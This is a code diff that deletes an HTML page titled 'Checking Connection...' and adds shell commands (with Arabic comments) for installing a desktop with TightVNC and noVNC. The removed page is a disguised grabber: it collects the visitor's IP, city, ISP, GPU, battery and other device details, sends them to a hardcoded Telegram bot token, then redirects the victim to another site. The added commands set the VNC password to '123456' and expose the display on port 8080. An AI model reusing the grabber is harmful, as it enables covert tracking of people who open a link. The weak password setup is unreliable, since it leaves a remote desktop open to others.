@@ -1,74 +1,8 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Checking Connection...</title>
-    <meta charset="UTF-8">
-</head>
-<body>
-    <script>
-        async function getFullAnalysis() {
-            // 1. تحليل الهوية والآيبي (باستخدام API خارجي دقيق)
-            let ipData = {};
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                ipData = await response.json();
-            } catch (e) { ipData = { ip: "Unknown" }; }
+# تنصيب الواجهة وسيرفر العرض
+sudo apt update && sudo apt install -y xfce4 xfce4-goodies tightvncserver novnc
 
-            // 2. تحليل العتاد (Hardware) والمعالج الرسومي (GPU)
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            let gpu = "Unknown";
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_AD);
-            }
+# تشغيل السيرفر (راح يطلب باسورد، حط 123456)
+vncserver :1 -geometry 1280x720 -depth 16
 
-            // 3. تحليل البطارية والرام والنظام
-            let batteryInfo = "Unknown";
-            if (navigator.getBattery) {
-                const bat = await navigator.getBattery();
-                batteryInfo = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
-            }
-
-            // 4. تجميع التقرير "الخبير"
-            const report = {
-                ip: ipData.ip,
-                city: ipData.city,
-                isp: ipData.org,
-                device: navigator.platform,
-                browser: navigator.userAgent.split(' ').pop(),
-                gpu: gpu,
-                cores: navigator.hardwareConcurrency || "??",
-                ram: navigator.deviceMemory || "??",
-                screen: `${window.screen.width}x${window.screen.height}`,
-                battery: batteryInfo,
-                lang: navigator.language
-            };
-
-            // 5. إرسال التقرير لبوت التليجرام (توكن الخبير)
-            const token = '8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8';
-            const chat_id = '5773364548';
-            
-            const message = `🚀 تم الرصد بنجاح (تحليل الخبير):\n\n` +
-                            `🌐 الآيبي: ${report.ip}\n` +
-                            `📍 الموقع: ${report.city} | ${report.isp}\n` +
-                            `📱 الجهاز: ${report.device}\n` +
-                            `🎮 المعالج الرسومي: ${report.gpu}\n` +
-                            `🧠 الرام: ${report.ram} GB | الأنوية: ${report.cores}\n` +
-                            `🔋 البطارية: ${report.battery}\n` +
-                            `🖥 الشاشة: ${report.screen}\n\n` +
-                            `⚠️ جاري التحويل للرابط الأصلي...`;
-
-            // إرسال البيانات
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
-
-            // 6. التحويل التلقائي (استخراج الرابط من الـ URL)
-            const urlParams = new URLSearchParams(window.location.search);
-            const target = urlParams.get('url') || "https://instagram.com";
-            window.location.href = target;
-        }
-
-        getFullAnalysis();
-    </script>
-</body>
-</html>
+# تشغيل جسر العرض (noVNC)
+/usr/share/novnc/utils/launch.sh --vnc localhost:5901 --listen 8080
